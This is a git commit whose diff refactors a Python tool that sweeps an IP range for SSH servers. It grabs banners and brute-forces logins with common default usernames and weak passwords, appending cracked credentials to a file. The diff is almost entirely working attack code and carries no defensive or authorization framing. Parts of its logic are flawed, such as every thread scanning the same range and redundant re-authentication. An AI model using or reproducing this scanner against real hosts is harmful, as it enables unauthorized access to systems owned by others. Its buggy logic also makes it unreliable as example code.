c5b71b3b3f5e6142ac6223e9099dfd3cc5ab7685
BongHitz <itz.bonghitz@gmail.com>
2023-05-20 20:10:11 -0400

    Update main.py
    This code uses functions to compartmentalize and modularize the different tasks we are performing. These functions include:
    - parse_arguments() : parse and handle command line arguments
    - grab_banner(ip,port) : grab the SSH banner from an IP address and port
    - authenticate(ip, username, password, protocol) : authenticate using username/pass over an IP
    - brute_force(ip, username, passwords, protocol) : Bruteforce the login for given username with two attempts with 3 passwords combination each.
    - scan_range(ip_range) : iterate over ip range to scan and brute force.
    - main() : handle execution of the program by parsing arguments and starting scan_range function with 10 threads. 
    
    The output is color-coded for readability, outputs successful login attempts to a file, and implements a stronger retry logic on failed login attempts.

--- main.py
+++ main.py
@@ -5,8 +5,19 @@ import threading
 import paramiko
 
 
-# Define banner grabbing function
+def parse_arguments():
+    """Parse the command-line arguments"""
+
+    parser = argparse.ArgumentParser(description="Scan an IP range for open SSH ports and attempt to authenticate.")
+    parser.add_argument("range",
+                        help="IP range in CIDR, hyphenated, or dotted decimal format."
+                             "Example: 127.0.0.1/24, 127.0.0.1-127.0.0.255, 127.0.0.1")
+    return parser.parse_args()
+
+
 def grab_banner(ip, port):
+    """Attempts to grab the SSH banner from the given IP address and port"""
+
     banner = ""
     try:
         sock = socket.socket()
@@ -20,63 +31,67 @@ def grab_banner(ip, port):
     return banner
 
 
-# Define authentication function
 def authenticate(ip, username, password, protocol):
-    result = False
+    """Attempts to authenticate using the supplied username and password on the given IP address"""
+
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        if protocol == "SSH-1.5":
-            client.connect(ip, username=username, password=password, port=22, allow_agent=False, look_for_keys=False, banner_timeout=2)
-        else:
-            client.connect(ip, username=username, password=password, port=22, allow_agent=False, look_for_keys=False, banner_timeout=2, ssh_version=2)
-        result = True
-    except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, OSError):
-        pass
+        client.connect(ip, username=username, password=password, port=22,
+                       allow_agent=False, look_for_keys=False, banner_timeout=2, ssh_version=2 if protocol == "SSH-2.0" else 1)
+    except (paramiko.ssh_exception.AuthenticationException,
+            paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, OSError):
+        return False
     finally:
         client.close()
-    return result
+    return True
 
 
-# Define thread function
+def brute_force(ip, username, passwords, protocol):
+    """Brute forces the login using the supplied usernames and passwords on the given IP address"""
+
+    for password in passwords:
+        if authenticate(ip, username, password, protocol):
+            print(f"\033[92m[+] Successfully authenticated with {username}:{password} on {ip}\033[0m")
+            with open("successful-logins.txt", "a") as f:
+                f.write(f"{ip},{username},{password}\n")
+            return
+    print(f"\033[91m[-] Failed to authenticate with {username} on {ip}\033[0m")
+
+
 def scan_range(ip_range):
+    """Scans the IP range for open SSH ports and attempt to authenticate"""
+
     for ip in ipaddress.IPv4Network(ip_range):
-        print(f"\n[*] Scanning {ip}")
         banner = grab_banner(str(ip), 22)
         if not banner:
             continue
+
+        print(f"\n[*] Scanning {ip}")
         print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")
+
         if "SSH-1.5" in banner:
             protocol = "SSH-1.5"
         else:
             protocol = "SSH-2.0"
-        for username in ["root", "admin", "ubuntu", "kali"]:
-            passwords = ["root", "kali", "123456", "qwerty", "debian", "admin"]
-            for i in range(2):
-                if i == 1:
-                    passwords = ["qwerty", "debian", "admin"]
-                for password in passwords:
-                    if authenticate(str(ip), username, password, protocol):
-                        print(f"\033[92m[+] Successfully authenticated with {username}:{password} on {ip}\033[0m")
-                        with open("successful-logins.txt", "a") as f:
-                            f.write(f"{ip},{username},{password}\n")
-                        break
-                if authenticate(str(ip), username, password, protocol):
-                    break
-                
-            if username != "root":
-                break
+
+        usernames = ["root", "admin", "ubuntu", "kali"]
+        passwords_try_1 = ["root", "kali", "123456"]
+        passwords_try_2 = ["qwerty", "debian", "admin"]
+
+        for username in usernames:
+            brute_force(ip, username, passwords_try_1, protocol)
+            if not authenticate(ip, username, passwords_try_1[0], protocol):
+                continue
+            brute_force(ip, username, passwords_try_2, protocol)
+            break
 
 
-# Main function
 def main():
-    # Parse command line arguments
-    parser = argparse.ArgumentParser(description="Scan an IP range for open SSH ports and attempt to authenticate")
-    parser.add_argument("range", help="IP range in CIDR, hyphenated, or dotted decimal format")
-    args = parser.parse_args()
-    
-    # Scan IP range using 10 threads
+    args = parse_arguments()
     ip_range = args.range
+
+    # Scan IP range using 10 threads
     threads = []
     for i in range(10):
         t = threading.Thread(target=scan_range, args=(ip_range,))
